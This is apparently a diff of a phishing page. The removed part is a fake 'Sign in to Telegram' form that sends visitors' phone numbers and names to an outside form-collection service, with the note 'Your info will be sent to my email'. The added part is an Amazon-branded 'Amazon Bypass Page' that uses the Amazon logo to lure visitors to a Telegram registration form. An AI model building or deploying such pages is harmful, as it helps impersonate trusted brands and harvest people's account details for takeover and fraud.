@@ -2,67 +2,69 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Telegram-style Login</title>
+  <title>Welcome - Amazon Bypass</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background: #e9ebee;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
       margin: 0;
+      font-family: Arial, sans-serif;
+      background: #f0f2f5;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
     }
-    .login-box {
+
+    .container {
       background: #ffffff;
-      padding: 30px;
-      border-radius: 8px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      border-radius: 12px;
+      padding: 40px 30px;
+      text-align: center;
       width: 90%;
       max-width: 400px;
-      text-align: center;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
     }
-    .login-box h2 {
-      color: #0088cc;
-      margin-bottom: 20px;
+
+    .logo {
+      width: 130px;
+      margin-bottom: 25px;
     }
-    .login-box input {
-      width: 100%;
-      padding: 12px;
+
+    h1 {
+      color: #232f3e;
       margin-bottom: 15px;
-      border: 1px solid #ccc;
-      border-radius: 4px;
-      font-size: 16px;
     }
-    .login-box button {
-      width: 100%;
-      background: #0088cc;
+
+    p {
+      font-size: 16px;
+      color: #444;
+      margin-bottom: 30px;
+    }
+
+    .btn {
+      background: #0073e6;
       color: white;
+      padding: 12px 25px;
       border: none;
-      padding: 12px;
-      border-radius: 4px;
+      border-radius: 6px;
       font-size: 16px;
       cursor: pointer;
+      text-decoration: none;
+      display: inline-block;
     }
-    .success {
-      color: green;
-      margin-top: 10px;
+
+    .btn:hover {
+      background: #005bb5;
     }
   </style>
 </head>
 <body>
 
-  <div class="login-box">
-    <h2>Sign in to Telegram</h2>
-
-    <form action="https://formspree.io/f/mgvydbna" method="POST">
-      <input type="tel" name="Phone Number" placeholder="+251912345678" required />
-      <input type="text" name="Name" placeholder="Your Name" required />
-      <button type="submit">Submit</button>
-    </form>
-
-    <p class="success">✅ Your info will be sent to my email.</p>
+  <div class="container">
+    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo" />
+    <h1>Amazon Bypass Page</h1>
+    <p>To continue, please register with your Telegram account to complete the process.</p>
+    <a class="btn" href="form.html">Register in Telegram</a>
   </div>
 
 </body>
